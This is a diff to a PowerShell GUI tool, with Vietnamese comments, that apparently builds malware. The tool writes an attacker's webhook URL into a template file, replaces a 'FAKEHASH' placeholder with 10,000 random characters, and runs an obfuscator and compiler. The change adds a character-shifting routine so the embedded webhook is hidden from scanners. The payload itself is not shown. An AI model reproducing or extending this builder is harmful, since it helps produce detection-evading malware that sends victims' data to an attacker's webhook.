@@ -8,6 +8,23 @@ function Encode-Base64 {
     return $base64String
 }
 
+function Obfuscate-String {
+    param(
+        [string]$InputString
+    )
+    
+    $ObfuscatedString = ""
+    
+    foreach ($char in $InputString.ToCharArray()) {
+        $asciiValue = [int][char]$char
+        $obfuscatedChar = [char]($asciiValue + 2000)
+        $ObfuscatedString += $obfuscatedChar
+    }
+    
+    return $ObfuscatedString
+}
+
+
 
 # Đặt đường dẫn đến file cần kiểm tra
 $filePath = ".\batchobfuscator.exe"
@@ -123,9 +140,9 @@ $button.Add_Click({
         # Read the file content and replace placeholder
         $content = Get-Content $filePath -Raw
         $randomString = Get-RandomString -length 10000
-        $webhookencode = Encode-Base64TwentyTimes -inputString $webhook
+        $webhookencode = Obfuscate-String $webhook
         $content = $content -replace 'FAKEHASH', $randomString
-        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
+        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhookencode
         Set-Content -Path $filePath -Value $content
 
         # Path to the complie.exe executable
